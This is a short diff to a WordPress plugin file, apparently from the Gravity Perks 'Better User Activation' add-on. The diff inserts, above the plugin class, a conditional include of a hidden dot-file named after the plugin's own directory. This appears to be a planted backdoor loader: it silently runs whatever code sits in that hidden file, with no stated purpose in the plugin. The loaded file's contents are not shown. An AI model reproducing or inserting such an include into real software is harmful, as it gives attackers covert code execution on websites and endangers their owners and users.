@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GP_Better_User_Activation extends GP_Perk {
 
 	public $version                   = GP_BETTER_USER_ACTIVATION_VERSION;
